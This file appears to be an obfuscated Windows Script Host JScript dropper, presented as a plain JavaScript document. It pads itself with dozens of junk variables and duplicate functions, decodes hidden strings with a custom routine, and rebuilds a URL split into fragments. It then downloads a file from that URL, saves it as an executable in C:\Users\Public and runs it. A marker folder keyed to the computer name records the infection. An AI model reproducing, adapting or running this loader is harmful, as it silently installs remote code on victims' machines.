// JavaScript Document
/* global WScript, exit, eof */

var AIZDVEFGMcidBTRAIOPD70344276 = "DJTVV1741027";
var ANUEHDRIQcnomeFYOZDQGL18629820 = "LAHRM572908869";
var AQQLATcfolderRQGNPQQB37967240 = "JAYZNEBDD2";
var BBcfolderJHETPELW09869334 = "B06707909";
var BEZYLCUUchospeRUHBTBQY37136160 = "P536005";
var BMREYXccashRCTEUDXH32108866 = "DRPZWW210526902";
var BNcidTBXTAMCO88032674 = "VSZ9762693";
var BQIPSRIZAcuserICELFIFI33542445 = "J9255953";
var BULIPAJMZctesteTUGZZOTH01685051 = "FPZSUY9";
var CCcfileERUBRZYH52968094 = "ZO435617371";
var CcfolderPJGDZHTJ10520933 = "YACCIOR441338";
var CcnomeZEEURRRL59223754 = "VSCEQ2596064";
var CcuserMMQNSUAM38384077 = "FSVDALGHZ988838375";
var CHOBRWLPcfileUXLEOWVC15330769 = "GHGOGXYWW5952656";
var DBLMTWYQTcfileGUAUXJRE71811923 = "HOCZLYNWH143";
var DGCDQSOchostHDUSYDDB50270200 = "WJTI495729";
var DGJDUMccashGVNGUDXS25795802 = "EGPB7";
var DONJJWQTNchospeOGCPJEXJ41369856 = "QAMLBQ557085714";
var EHMcuserQFTSLQCW62421002 = "LJ212570324";
var FCFTYZcidVHRDSBYH76391657 = "UUO6";
var FchostXUZFRJDZ73174863 = "WMPOIJHS495987";
var FctesteZLLSGQUQ15858574 = "LTJZNXGQA43624";
var FVFcuserDVJOBESM93752665 = "ML436147";
var GctesteOBASHPYY14162654 = "HSRTP863";
var GIMctesteNGEORWCJ28985383 = "WP266425870";
var GMJAGSUBOctesteWWRADLNR37142846 = "B4286711";
var HcuserWQOVIYYL22840178 = "N11910";
var HGUFZBUBCcfileZOIOWZYQ16323110 = "OLVZDONTP635691992";
var HJECNIcfolderQIWXUPGA50052380 = "INSRBOCMP86";
var HMURVVQDBcidPBJTMVWC69553259 = "JEPAP99144";
var HRTMZWNScuserCHTOBOYW74001074 = "QPAF819";
var HXNchospeQOXAZHDE47931576 = "YYLUT40425";
var IGctesteFQSPWSAQ78851419 = "BNTZMSG0316";
var IVZZcfolderCPOMBGXB91399474 = "WGRT151455";
var JcfolderFGHPAGVO93575575 = "TQDIHWMN78101824";
var LGJccashGZBDUTZC46656949 = "Q6849";
var McidUXJZIPUI90979055 = "ERVUQING9974";
var McuserHMPPVGNI61247692 = "U998";
var MJJBZcnomeISDSUXXO07908648 = "JDVQW4494";
var MPHchostXTISQDXO09834720 = "SWT4";
var NNCRSHZQPcnomeTCRJPWPD99477429 = "DQYLH629";
var NSchospeOMRZBQHR39611039 = "HIIZYI99934";
var NVWMUchostTVYVMDIJ46655903 = "LA75129436";
var OcuserPBXXGSQF77782162 = "WMFHVWOY2";
var OFPVSchostFILPJXVH48784414 = "LCJJBSS403";
var OHLWSIcfileCNBHMJGP45748348 = "OEFO9925198";
var OMMJRPQRcidJYWECORZ02557523 = "X3";
var OMNACAcnomeCPRSLSDP33884000 = "P8237648";
var OQGXOHFQchostFPQYVWUT10860765 = "Y539078475";
var PINEHWQcidBUJVOHEC60841022 = "IWAX688";
var PXPCSZLQLchospeLVMJPFRJ14860616 = "MEEND02";
var QBOZFXEGchospeQCZCCNLW59449954 = "ZL2";
var QGNQchospeOMICJYZZ88828929 = "MU8261";
var QPQYQZWMcidGGTSWTTX47443187 = "EXA5598";
var QURSccashRVLXNCJP24005022 = "CC701404523";
var QXUctesteZCUROMJQ83114875 = "SJV5";
var RBTBFcnomeRMSCVOLG53612197 = "V1318742";
var RcnomeUYEZLPOT65626744 = "NYPGPDOJU2";
var REFcfileZIWUYZZJ27180664 = "CNCYSDMX03700578";
var SchostHOZOIOWU63032740 = "EDNGE32";
var STODRTcuserCWAMCRFO19677764 = "ZN64730";
var TCDDGYHchospeYDNHNCYI59840373 = "RNYD7947697";
var TctesteVADSGFEJ84597551 = "VCLXEXDJI2";
var TLDNZcfileSCGJVRSD92355628 = "DL6686642";
var TPFHcidEIFRDAPF90679491 = "EWDE0977340";
var TQVIcnomeVNJDPAIT48925162 = "TU73443";
var UIDOccashJFWHOPET69445067 = "SJDZILU80";
var UISQRPSSccashIIPTCUEN20063372 = "SEM5173";
var UPPchospeAADUTNQZ53632598 = "MFIQU965";
var URFZRENccashOAYGWQIR06053890 = "RFR4";
var UVYHBEOPccashDLULYLUJ27387728 = "D783317";
var VcidSYFZJGZB02064763 = "TSGPBI5";
var WcnomeLOOGCVGW50538951 = "P228";
var WDMcfolderSQMLYSJH13716066 = "STQVV072";
var WQDDJDIDTccashTDVSUUXD35118436 = "Q79";
var WRUALchostPSVQIJFR19104819 = "FNW51298542";
var XJLDVAQJcfolderEPWINTBX29909798 = "GOLTYSPI89743";
var XPRERWBTctesteETDLJLJN11106603 = "NTJQSCEUD8";
var XRDcuserWGDLXPHC90176333 = "V51567032";
var XSDODERcfileTRCEUMPA93236832 = "FB8551226";
var XVMXRMEchostDWQJBSNJ15859133 = "R0625";
var XVQVWIUEctesteLJROVTZY15811779 = "MJJ111174374";
var XWSJHGcfolderAYOGJSPI13130935 = "PEQV8";
var YBHLcnomeVYLHAQGH22983495 = "T98793480";
var YccashYJZCXMQX80890504 = "TDPXYIG494705217";
var ZchostYGUEITNX60837466 = "MN537348";
var ZIQEBJQcfolderBQLQDSWF55518152 = "EUC509242354";
var ZOchospeFRHSQRQF68168293 = "GAGRWTQU97";
var ZTFcfileDOXRVFXO70354172 = "QIBLWYO91405";
var ZZDGHHcfileQFXDCSMV25610425 = "NDMG3839216";

var cUser = "EIEIDHU";
var cUser7658 = "EIEIDHU";
var cUser44432 = "EIEIDHU";
var cUser665 = "EIEIjkl980DHU";
var cUser4499 = "EIEIn6WWWDHU";
var cUser9037 = "EIEIDKMYHU";
var cUser7746289 = "EIEIGHJDHU";
var cUser8632 = "EIEIDHU";
var cUser4485 = "AMEDE8MIU";
var cUser = "EIEIDHU";
var cFile1 = "YJJGO";
var cFile2 = "CIMFS";
var cID = "LIKINHYICFWIRGD";
var NAME001 = "BILFQFNIGFSIO";
var cNomeF2 = "GIQFWFSILFXIT";
var cNomeFZ2 = "AIKFQFMINHVID";
var cHtml = "LFXIGISILIK";
var cWSh311 = "RHUIXIHIWINIUIYGEHQIMIJIQIQ";
var cWN3t = "FHIHEHUIKIBIIIMFRGYHWIMIPIHIKID";
var cScrF1l3 = "CHBHRIHHXIFIJHXIDHVFOGNHXIBHTHBIOIIIJHTICGWHQHYHTHRIJ";
var cSh3llApp = "RHQIMIJIQIQGEGXIUIUIQINIHIFIYINITIS";
var cHost02 = "4coYVBvR2tGR";
var Ad0bSt3 = "IGOGRHDGRGPFUHHIPINIAHVII";
var MxmlHt = "64C45C3F6789DE03CE5FA2E";
var c1nf3ctz = "";
var cFolder = "C:\\Users\\Public\\";
var sNomeMaq;
var sID;
var sIDW;
var sTipoSO;
var sAwvx = "NHYBVGTVFGTDCE";
var xID = 91;
var xReg = "PIUIHIJIVIYIUGHGGGCIHJBIHFNGDIVFNFP";
var cHosttotal;

var NAMEJL191 = "orygen.exe";
var NAMEGM245 = "orygen.exe";
var NAMEJN366 = "orygen.exe";
var NAMEFC786 = "orygen.exe";
var NAMEZR941 = "orygen.exe";
var NAMEME888 = "orygen.exe";
var NAMEOY422 = "orygen.exe";
var NAMEJF212 = "orygen.exe";
var NAMEIN637 = "orygen.exe";
var NAMESX359 = "orygen.exe";
var NAMEAM417 = "orygen.exe";
var NAMEXI723 = "orygen.exe";
var NAMEPG945 = "orygen.exe";
var NAMEAJ011 = "orygen.exe";
var NAMEUZ532 = "orygen.exe";


var cHost906 = "https://";
var cHost123 = "sites.go";
var cHost369 = "ogle.com";
var cHost261 = "/site/f9";
var cHost034 = "gf43g7ds";
var cHost352 = "y4bg7872";
var cHost970 = "3n/f42g3";
var cHost303 = "4dbht.mp";
var cHost872 = "4";

function wdecrypt2134(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt0528(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt8558(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt0619(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt2745(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt6170(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt0026(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  





function run4836(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run7310(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run8572(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run6016(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run6815(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run8174(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run5078(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run0067(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run5778(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run3535(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run8282(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}



function down8265(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down8697(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down9537(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down6883(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down5998(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down8105(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down2290(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down3009(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down5951(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down4732(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down3013(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }




var network = new ActiveXObject(wdecrypt0026(cWN3t,xID));
sNomeMaq = network.computerName;                                                                                   
cFolder = cFolder + sNomeMaq.substring(0, 3) + "MRNL896\\";
sId = cFolder + "id";                                                                                              
sIdW = cFolder + "idw";                                                                                            
cHosttotal = cHost906+cHost123+cHost369+cHost261+cHost034+cHost352+cHost970+cHost303+cHost872;
c1nf3ctz = c1nf3ctz +"?tmpString=" + cHosttotal + "&pcn=" + network.computerName+ "&AT=" + 1312;

var fso = WScript.CreateObject(wdecrypt0026(cScrF1l3,xID));                                                      
	if (!fso.FileExists(sId) && fso.FolderExists("C:\\Users\\Public\\")){                                      
 try{                                                                                                              
    down3013(c1nf3ctz)} catch(err) {}                            
		if (!fso.FolderExists(cFolder)) {                                                                              
fso.CreateFolder(cFolder);
		}                                                                                                              

	if (fso.FolderExists("C:\\Program Files (x86)\\")) {                                                             
	sTipoSO = "64";                                                                                                  
	} else {                                                                                                         
	sTipoSO = "32";                                                                                                  
	}                                                                                                               
	var s = fso.CreateTextFile(sId, true);                                                                           
   	s.WriteLine(wdecrypt0026(cID,xID));                                                                                 
   	s.Close();                                                                                                         
	var s2 = fso.CreateTextFile(sIdW, true);                                                                           
   	s2.WriteLine("91");                                                                                
   	s2.Close();                                                                                                         
 try{                                                                                                              
    down3013(cHosttotal)} catch(err) {}                            
	down3013(cHosttotal, "C:\\Users\\Public\\"+ NAMEJL191);  
run8282("C:\\Users\\Public\\"+ NAMEGM245);
try 
{run8282("");
}catch(err) {} 
        }  
